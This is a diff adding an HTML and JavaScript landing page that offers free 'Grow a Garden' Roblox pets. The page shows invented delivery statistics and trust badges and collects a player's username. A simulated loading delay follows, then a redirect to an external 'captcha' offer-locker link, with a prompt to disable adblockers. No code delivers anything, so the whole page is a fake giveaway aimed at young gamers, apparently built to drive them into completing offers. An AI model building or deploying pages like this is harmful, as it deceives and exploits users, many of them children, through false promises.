+            transition: 0.5s;
+        }
+
+        .cta-button:hover::before {
+            left: 100%;
+        }
+
+        /* Username Entry Section */
+        .username-section {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 3rem 2rem;
+            margin: 4rem auto;
+            max-width: 600px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.2);
+            display: none;
+        }
+
+        .username-section.active {
+            display: block;
+            animation: slideUp 0.6s ease;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .username-form {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .username-input {
+            flex: 1;
+            min-width: 250px;
+            padding: 1rem 1.5rem;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 1.1rem;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
+        }
+
+        .username-input::placeholder {
+            color: rgba(255,255,255,0.7);
+        }
+
+        .username-input:focus {
+            outline: none;
+            border-color: #feca57;
+            box-shadow: 0 0 20px rgba(254,202,87,0.3);
+        }
+
+        /* Pet Grid Section */
+        .pets-section {
+            padding: 4rem 1rem;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .section-title {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, #feca57, #ff9ff3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .popular-pets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            margin-bottom: 4rem;
+        }
+
+        .popular-pet {
+            background: linear-gradient(135deg, rgba(255,255,255,0.2), rgba(255,255,255,0.1));
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            border: 2px solid rgba(254,202,87,0.5);
+            backdrop-filter: blur(20px);
+            transition: all 0.4s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .popular-pet::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, rgba(254,202,87,0.1), rgba(255,107,107,0.1));
+            opacity: 0;
+            transition: 0.3s;
+        }
+
+        .popular-pet:hover::before {
+            opacity: 1;
+        }
+
+        .popular-pet:hover {
+            transform: translateY(-10px) scale(1.05);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            border-color: #feca57;
+        }
+
+        .popular-pet.selected {
+            border-color: #ff6b6b !important;
+            background: linear-gradient(135deg, rgba(255,107,107,0.2), rgba(255,107,107,0.1)) !important;
+            box-shadow: 0 8px 32px rgba(255, 107, 107, 0.4) !important;
+        }
+
+        .pet-rank {
+            font-size: 3rem;
+            font-weight: 900;
+            background: linear-gradient(45deg, #feca57, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+        }
+
+        .pet-image {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 1rem;
+            border-radius: 15px;
+            object-fit: cover;
+            border: 3px solid rgba(255,255,255,0.3);
+            transition: 0.3s;
+        }
+
+        .popular-pet:hover .pet-image {
+            border-color: #feca57;
+            transform: scale(1.1);
+        }
+
+        .pet-name {
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            text-transform: capitalize;
+        }
+
+        .pet-rarity {
+            padding: 0.5rem 1rem;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 1rem;
+            display: inline-block;
+        }
+
+        .pet-rarity.divine {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+        }
+
+        .select-badge {
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 25px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 1rem;
+            display: inline-block;
+            opacity: 0.8;
+            transition: 0.3s;
+        }
+
+        .popular-pet:hover .select-badge {
+            opacity: 1;
+            transform: scale(1.05);
+        }
+
+        /* Trust Indicators */
+        .trust-section {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            padding: 3rem 2rem;
+            margin: 4rem 0;
+            border-radius: 20px;
+            text-align: center;
+        }
+
+        .trust-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .trust-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .trust-icon {
+            font-size: 3rem;
+            color: #feca57;
+            margin-bottom: 1rem;
+        }
+
+        .trust-number {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #feca57;
+        }
+
+        .trust-label {
+            font-size: 1rem;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+
+        /* Footer CTA */
+        .footer-cta {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            padding: 4rem 2rem;
+            text-align: center;
+            margin-top: 4rem;
+        }
+
+        .footer-cta h2 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+        }
+
+        .footer-cta p {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid #feca57;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Username error styles */
+        .username-error {
+            background: rgba(255,107,107,0.2);
+            border: 1px solid rgba(255,107,107,0.5);
+            border-radius: 10px;
+            padding: 1rem;
+            margin-top: 1rem;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #ff6b6b;
+            backdrop-filter: blur(10px);
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .offers-notice {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
+            padding: 1rem;
+            margin-top: 2rem;
+            text-align: center;
+            font-size: 0.9rem;
+            backdrop-filter: blur(10px);
+        }
+
+        /* Pet Selection Confirmation Animation */
+        .pet-selection-confirmation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            pointer-events: none;
+            animation: fadeInOut 3s ease;
+        }
+
+        .confirmation-content {
+            background: linear-gradient(135deg, rgba(255,255,255,0.95), rgba(248,249,255,0.95));
+            color: #333;
+            padding: 3rem 2rem;
+            border-radius: 25px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            border: 3px solid #feca57;
+            transform: scale(0.5);
+            animation: popIn 0.6s ease forwards;
+            backdrop-filter: blur(20px);
+        }
+
+        .confirmation-content i {
+            font-size: 3rem;
+            color: #39D353;
+            margin-bottom: 1rem;
+            animation: bounce 0.8s ease infinite alternate;
+        }
+
+        .confirmation-content h3 {
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .confirmation-content p {
+            font-size: 1.2rem;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+
+        .rarity-badge {
+            padding: 0.5rem 1rem;
+            border-radius: 25px;
+            color: white !important;
+            font-weight: 700;
+            margin: 1rem 0;
+            display: inline-block;
+        }
+
+        .username-confirm {
+            opacity: 0.7;
+            font-size: 1rem !important;
+            font-weight: 500 !important;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.5) rotate(-5deg); opacity: 0; }
+            50% { transform: scale(1.1) rotate(2deg); }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+
+        @keyframes fadeInOut {
+            0% { opacity: 0; }
+            15% { opacity: 1; }
+            85% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 2.5rem;
+            }
+
+            .stats-container {
+                gap: 1rem;
+            }
+
+            .username-form {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .username-input {
+                min-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-animation">
+        <div class="floating-shapes">
+            <div class="shape"></div>
+            <div class="shape"></div>
+            <div class="shape"></div>
+            <div class="shape"></div>
+            <div class="shape"></div>
         </div>
     </div>
 
-    <!-- Completed Offers Counter -->
-    <div id="completedCounter" class="completed-offers" style="display: none;">
-        Completed: <span id="completedCount">0</span>/2
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="hero-content">
+            <div class="hero-badge">
+                <i class="fas fa-fire"></i> LIMITED TIME OFFER - 100% FREE
+            </div>
+            <h1 class="hero-title">Get ANY Grow a Garden Pet <span style="color: #feca57;">INSTANTLY!</span></h1>
+            <p class="hero-subtitle">Choose from 50+ exclusive pets including Divine & Legendary rarities. Fast delivery to your Roblox account!</p>
+
+            <div class="stats-container">
+                <div class="stat-item">
+                    <span class="stat-number">25,000+</span>
+                    <span class="stat-label">Pets Delivered</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">5⭐</span>
+                    <span class="stat-label">Rating</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">24/7</span>
+                    <span class="stat-label">Support</span>
+                </div>
+            </div>
+
+            <button class="cta-button" onclick="showUsernameSection()">
+                <i class="fas fa-rocket"></i> GET MY FREE PET NOW
+            </button>
+        </div>
+    </section>
+
+    <!-- Username Entry Section -->
+    <section class="username-section" id="usernameSection">
+        <h2 style="font-size: 2rem; margin-bottom: 1rem;">🎯 Enter Your Roblox Username</h2>
+        <p style="opacity: 0.9; margin-bottom: 0.5rem;">We'll deliver your selected pet directly to this account</p>
+        <p style="opacity: 0.8; margin-bottom: 1rem; font-size: 0.9rem; color: #feca57;">⚠️ Make sure you enter your <strong>username</strong> and not the display name!</p>
+
+        <div class="username-form">
+            <input type="text" class="username-input" id="usernameInput" placeholder="Your Roblox Username (minimum 6 characters)" required minlength="6">
+            <button class="cta-button" onclick="proceedToSelection()">
+                <i class="fas fa-arrow-right"></i> CONTINUE
+            </button>
+        </div>
+
+        <div class="username-error" id="usernameError" style="display: none;">
+            <i class="fas fa-exclamation-triangle"></i> Please make sure you entered your username (not display name) correctly!
+        </div>
+
+        <div class="offers-notice">
+            <i class="fas fa-shield-alt"></i> Secure & Safe - We never ask for passwords or personal information
+        </div>
+    </section>
+
+    <!-- Pet Selection Section -->
+    <section class="pets-section" id="petsSection" style="display: none;">
+        <div class="section-header">
+            <h2 class="section-title">🔥 MOST POPULAR PETS</h2>
+            <p style="font-size: 1.1rem; opacity: 0.9;">These are flying off the shelves! Get yours before they're gone!</p>
+        </div>
+
+        <div class="popular-pets-grid" id="popularPets">
+            <!-- Popular pets will be populated by JavaScript -->
+        </div>
+
+        <!-- Trust Section -->
+        <div class="trust-section">
+            <h3 style="font-size: 2rem; margin-bottom: 1rem;">Why 25,000+ Players Choose Us</h3>
+            <div class="trust-grid">
+                <div class="trust-item">
+                    <i class="fas fa-lightning-bolt trust-icon"></i>
+                    <div class="trust-number">30 SEC</div>
+                    <div class="trust-label">Average Delivery</div>
+                </div>
+                <div class="trust-item">
+                    <i class="fas fa-shield-check trust-icon"></i>
+                    <div class="trust-number">100%</div>
+                    <div class="trust-label">Safe & Secure</div>
+                </div>
+                <div class="trust-item">
+                    <i class="fas fa-users trust-icon"></i>
+                    <div class="trust-number">25K+</div>
+                    <div class="trust-label">Happy Players</div>
+                </div>
+                <div class="trust-item">
+                    <i class="fas fa-headset trust-icon"></i>
+                    <div class="trust-number">24/7</div>
+                    <div class="trust-label">Live Support</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Final CTA -->
+        <div class="footer-cta">
+            <h2>Ready to Get Your Dream Pet?</h2>
+            <p>Join thousands of players who already got their favorites!</p>
+            <button class="cta-button" onclick="triggerPetSelection()" style="font-size: 1.5rem; padding: 1.5rem 4rem;">
+                <i class="fas fa-gift"></i> CLAIM MY PET NOW!
+            </button>
+        </div>
+    </section>
+
+    <!-- Loading Animation -->
+    <div class="loading" id="loadingAnimation">
+        <div class="spinner"></div>
+        <p style="margin-top: 1rem;">Loading your pets...</p>
+        <p style="font-size: 0.9rem; opacity: 0.8; margin-top: 0.5rem;">💡 Try turning off your adblocker if the offers don't load</p>
     </div>
 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        // Pet data - DIVINE PETS ONLY - CORRECTLY MAPPED
+        const pets = {
+            divine: [
+                { name: 'dragonfly', image: 'https://i.ibb.co/RT3HkYGR/echo-frog.png' },
+                { name: 'queen bee', image: 'https://i.ibb.co/7dddHxBG/raccoon.png' },
+                { name: 'raccoon', image: 'https://i.ibb.co/TqnssfKd/dragonfly.png' },
+                { name: 'blood owl', image: 'https://i.ibb.co/2YdrwqTz/frog.png' },
+                { name: 'night owl', image: 'https://i.ibb.co/MytmtpXm/black-bunny.png' }
+            ]
+        };
+
+        // Popular pets (top 3 from divine rarity)
+        const popularPets = [
+            { name: 'dragonfly', image: 'https://i.ibb.co/RT3HkYGR/echo-frog.png', rank: '#1' },
+            { name: 'queen bee', image: 'https://i.ibb.co/7dddHxBG/raccoon.png', rank: '#2' },
+            { name: 'raccoon', image: 'https://i.ibb.co/TqnssfKd/dragonfly.png', rank: '#3' }
+        ];
+
+        let selectedPet = null;
+        let username = '';
+
+        // Show username section
+        function showUsernameSection() {
+            document.getElementById('usernameSection').classList.add('active');
+            document.getElementById('usernameSection').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Show username error
+        function showUsernameError(message) {
+            const usernameError = document.getElementById('usernameError');
+            const usernameInput = document.getElementById('usernameInput');
+
+            usernameError.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ' + message;
+            usernameError.style.display = 'block';
+            usernameInput.focus();
+
+            // Scroll to show the error
+            usernameError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+
+        // Proceed to pet selection after username entry
+        function proceedToSelection() {
+            const usernameInput = document.getElementById('usernameInput');
+            const usernameError = document.getElementById('usernameError');
+            const usernameValue = usernameInput.value.trim();
+
+            // Hide any previous error
+            usernameError.style.display = 'none';
+
+            if (!usernameValue) {
+                showUsernameError('Please enter your Roblox username to continue!');
+                return;
+            }
+
+            if (usernameValue.length < 6) {
+                showUsernameError('Please make sure you entered your username (not display name) correctly!');
+                return;
+            }
+
+            username = usernameValue;
+
+            // Show loading animation
+            document.getElementById('loadingAnimation').style.display = 'block';
+            document.getElementById('loadingAnimation').scrollIntoView({ behavior: 'smooth' });
+
+            // Simulate loading then show pets
+            setTimeout(() => {
+                document.getElementById('loadingAnimation').style.display = 'none';
+                document.getElementById('petsSection').style.display = 'block';
+                createPopularPets();
+                document.getElementById('petsSection').scrollIntoView({ behavior: 'smooth' });
+            }, 2000);
+        }
+
+        // Create popular pets section
+        function createPopularPets() {
+            const container = document.getElementById('popularPets');
+
+            popularPets.forEach(pet => {
+                const petCard = document.createElement('div');
+                petCard.className = 'popular-pet';
+                petCard.innerHTML = `
+                    <div class="pet-rank">${pet.rank}</div>
+                    <img src="${pet.image}" alt="${pet.name}" class="pet-image">
+                    <div class="pet-name">${pet.name}</div>
+                    <div class="pet-rarity divine">DIVINE</div>
+                    <div class="select-badge">✨ SELECT THIS PET</div>
+                `;
+
+                petCard.addEventListener('click', () => selectPet(pet.name, pet.image, 'divine'));
+                container.appendChild(petCard);
+            });
+        }
+
+        // Select pet function
+        function selectPet(name, image, rarity) {
+            // Remove previous selection
+            document.querySelectorAll('.pet-card, .popular-pet').forEach(card => {
+                card.classList.remove('selected');
+            });
+
+            // Add selection to clicked card
+            event.currentTarget.classList.add('selected');
+
+            selectedPet = { name, image, rarity };
+
+            // Store selected pet and username immediately
+            if (selectedPet && username) {
+                localStorage.setItem('selectedPet', JSON.stringify(selectedPet));
+                localStorage.setItem('username', username);
+            }
+
+            // Show animated confirmation and redirect immediately for mobile compatibility
+            showPetSelectionAnimation(name, rarity);
+
+            // Redirect immediately for mobile compatibility
+            setTimeout(() => {
+                redirectToLocker();
+            }, 800);
+        }
+
+        // Show pet selection animation
+        function showPetSelectionAnimation(name, rarity) {
+            // Create floating confirmation message
+            const confirmationDiv = document.createElement('div');
+            confirmationDiv.className = 'pet-selection-confirmation';
+            confirmationDiv.innerHTML = `
+                <div class="confirmation-content">
+                    <i class="fas fa-check-circle"></i>
+                    <h3>Perfect Choice!</h3>
+                    <p><strong>${name.toUpperCase()}</strong></p>
+                    <p class="rarity-badge ${rarity.toLowerCase()}" style="background: linear-gradient(45deg, #ff6b6b, #ee5a52);">${rarity.toUpperCase()}</p>
+                    <p class="username-confirm">For: ${username}</p>
+                    <button onclick="redirectToLocker()" style="background: linear-gradient(45deg, #ff6b6b, #ee5a52); color: white; border: none; padding: 12px 24px; border-radius: 25px; font-weight: 700; margin-top: 1rem; cursor: pointer; font-size: 1rem;">🚀 CLAIM NOW</button>
+                    <p style="margin-top: 0.5rem; font-size: 0.8rem; color: #667eea; font-weight: 500;">Auto-redirecting in a moment...</p>
+                </div>
+            `;
+
+            document.body.appendChild(confirmationDiv);
+
+            // Remove after animation
+            setTimeout(() => {
+                if (confirmationDiv.parentNode) {
+                    confirmationDiv.parentNode.removeChild(confirmationDiv);
+                }
+            }, 3000);
+        }
+
+        // Trigger pet selection (for CTA button)
+        function triggerPetSelection() {
+            if (!selectedPet) {
+                // Scroll to pets and highlight them
+                document.getElementById('petsSection').scrollIntoView({ behavior: 'smooth' });
+
+                // Add shake animation to all pet cards
+                document.querySelectorAll('.pet-card, .popular-pet').forEach(card => {
+                    card.style.animation = 'shake 0.5s ease-in-out';
+                    setTimeout(() => {
+                        card.style.animation = '';
+                    }, 500);
+                });
+                return;
+            }
+            redirectToLocker();
+        }
+
+        // Mobile-friendly redirect function
+        function redirectToLocker() {
+            // Store selected pet and username
+            if (selectedPet && username) {
+                localStorage.setItem('selectedPet', JSON.stringify(selectedPet));
+                localStorage.setItem('username', username);
+            }
+
+            // Mobile-friendly redirect - detect mobile and use appropriate method
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+            if (isMobile) {
+                // For mobile, use location.href for better compatibility
+                window.location.href = 'https://captcha.shereview.net/48dfd486';
+            } else {
+                // For desktop, try to open in new tab
+                const newWindow = window.open('https://captcha.shereview.net/48dfd486', '_blank');
+                // Fallback if popup blocked
+                if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                    window.location.href = 'https://captcha.shereview.net/48dfd486';
+                }
+            }
+        }
+
+        // Legacy function for compatibility
+        function showModalOffers() {
+            redirectToLocker();
+        }
+
+        window.showModalOffers = showModalOffers;
+    </script>
 </body>
 </html>
